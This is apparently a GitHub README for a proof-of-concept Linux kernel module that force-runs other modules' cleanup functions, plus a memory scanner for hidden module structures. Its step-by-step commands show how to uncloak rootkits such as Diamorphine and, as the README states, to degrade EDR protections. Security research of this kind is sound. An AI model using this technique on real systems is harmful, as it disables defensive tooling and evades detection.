# hammertime

`hammertime` is a proof-of-concept LKM used to force running the
`cleanup_module()` functions of other LKMs including those resistant
to `rmmod` (e.g., rootkits or EDR software). This often results in
removal of hooks applied by the targeted module which tends to uncloak
rootkits and seriously degrade the functionality of EDR.

From here, both defenders and attackers can take advantage of the
degraded state of the targeted software--removing the rootkit
components while they are decloaked or carrying out operations with
degraded preventions and detections.

This builds on the technique outlined in https://github.com/MatheuZSecurity/UnhookingLinuxEdr
which demonstrates how to manually invoke a LKM's `cleanup_module()`
function using its symbol address  in `/proc/kallsyms`.

WARNING: This technique may cause your system to crash if the module
being unloaded has a buggy `cleanup_module()` implementation (e.g.,
Reptile). Always test in an isolated VM and expect instability when
experimenting with unknown modules.

Finally, don't be an idiot: This PoC is for educational and
professional use only. Don't use it to break the law, mess with your
company's security tools, or bypass protections so you can play games,
look at questionable websites, or work around protections to make
developing software easier for you. If you use this and get *fired,
arrested, or deported*, that's your own fault.

# Example usage

First, build the `canttouchthis.ko`, `hammertime.ko`, and
`breakitdown.ko` LKMs. Installing the relevant compilers, headers, and
library is left as an exercise to the reader:

```sh
git clone git@github.com:droberson/hammertime.git
cd hammertime
make
```

This builds three modules:

- `hammertime.ko` - a generic force-unloader LKM. It accepts a
  `cleanup_fn=0xaddress` parameter which it will call upon loading,
  triggering the `cleanup_module()` function of the target module. It
  then immediately returns `-ECANCELLED`, causing itself to unload
  cleanly (but throws an error to the user loading it).

- `canttouchthis.ko` - a generic LKM that does nothing except for
  increase its reference count to prevent easy unloading with `rmmod`.

- `breakitdown.ko` - a memory scanner that looks for potential `struct
  module` structures in memory.

## Load `canttouchthis.ko`:

```sh
sudo insmod canttouchthis.ko
```

WARNING: This will almost certainly fail on systems with Secure Boot
enabled. I do not recommend you disable this to get this PoC to
work; instead, use a VM as stated above.

## Verify that `canttouchthis.ko` is loaded:

```sh
sudo lsmod | grep canttouchthis

dmesg | tail
```

## Try to unload `canttouchthis.ko` with `rmmod`:

```sh
sudo rmmod canttouchthis.ko
```

This will likely fail:

```
rmmod: ERROR: Module canttouchthis is in use
```

## Grab the `cleanup_module()` address from `/proc/kallsyms`:

```sh
sudo grep canttouchthis /proc/kallsyms | grep cleanup_module
```

This should give you output something like this:

```
ffffffffc079d000 t cleanup_module	[canttouchthis]
```

The first field, `ffffffffc079d000` is the `cleanup_module` address
for `canttouchthis`. This will be different on your system, and very
likely different each time it is loaded.

## Finally, use `hammertime.ko` to unload it:

```sh
sudo insmod hammertime.ko cleanup_fn=0xffffffffc079d000
```

This will print an error message, which is by design. This
prevents the extra step of having to unload the module after
`cleanup_module()` has been called:

```
insmod: ERROR: could not insert module hammertime.ko: Operation canceled
```

You can verify that it has been unloaded by having a look at `dmesg`:

```
[48264.955022] canttouchthis: unloading
```

NOTE: `lsmod` may still show that the module is loaded, however the
cleanup function has been called as shown in `dmesg`. It can likely be
removed with `rmmod` at this point, or left alone. Do whatever you
want to do here, I'm not your dad.

## breakitdown.ko

Often, rootkits will take measures to hide themselves from casual
observation from tools such as `lsmod` or `kallsyms`. This makes
finding the `cleanup_module()` address difficult.

`breakitdown.ko` can be used to scan a given memory range for
potential `struct module` entries and prints them to the kernel's ring
buffer log. These can be viewed with `dmesg` or in `kern.log`.

Example usage:

First, you need to determine suitable memory ranges to search. To help
with this, I made a quick and dirty one-liner with `awk` to search
`/proc/kallsyms` for the highest and lowest addresses of
`cleanup_module()` functions. This can be used as a starting point for
`scan_start` and `scan_end` parameters that can be passed to
`breakitdown.ko`:

```
awk '/cleanup_module/ && $1 ~ /^ffffffffc/ { print "0x"$1 }' /proc/kallsyms \
  | sort -n \
  | awk '
    NR==1 { low=strtonum($1) }
    { high=strtonum($1) > high ? strtonum($1) : high }
    END {
      pad = 0x10000
      printf "scan_start=0x%x scan_end=0x%x\n", low - pad, high + pad
    }'
```

This should output something like this:

```
scan_start=0xffffffffc0198800 scan_end=0xffffffffc0654000
```

You may need to decrease `scan_start` or increase `scan_end` a bit so
it scans the memory ranges that the rootkit's hidden `struct module`
entry resides in. It is very important that `scan_start` is divisible
by the value defined in `MODULE_SCAN_STEP` in `breakitdown.c`. This
value is `64` by default.

I typically verify this with Python:

```
Python 3.6.9 (default, Mar 10 2023, 16:46:00)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xffffffffc0198800 % 64
0
```

Next, load `breakitdown.ko` with the desired `scan_start` and
`scan_end` values. This will scan the provided ranges and output
potential matches as kernel messages:

```
insmod breakitdown.ko scan_start=0xffffffffc0198800 scan_end=0xffffffffc0754000
```

View the output with `dmesg`. In this example, you can see it
successfully revealing the presence of the Diamorphine rootit:

```
[56834.494195] breakitdown: scanning for 'struct module' entries from ffffffffc0198800 to ffffffffc0754000...
...
[56834.529398] breakitdown: found module 'diamorphine' at ffffffffc0684040, state=0, refcnt=1, cleanup=ffffffffc0682650
...
[56834.548283] breakitdown: done - 93 likely 'struct module' entries found
```

The module returns `-ECANCELED` so it does not remain loaded. This
will display an error on the terminal even though the module was ran:

```
insmod: ERROR: could not insert module breakitdown.ko: Operation canceled
```

WARNING: this scanner is brittle and may need to be tweaked on
different systems. See the source code for more information.

# Closing Thoughts

This technique is highly situational and depends entirely on the
stability and accessibility of the target module's `cleanup_module()`
function. Many LKMs (like Reptile) may crash the system during
teardown. Others may omit a cleanup function entirely.

This PoC is meant as a springboard for further testing and adaptation
in security tooling. I have not tested it against commercial EDR LKMs,
but the technique shown should generalize to many defensive modules
exposing a `cleanup_module()` symbol.

For deeper technical details, see the accompanying blog post:

https://www.danielroberson.com/WORK_IN_PROGRESS
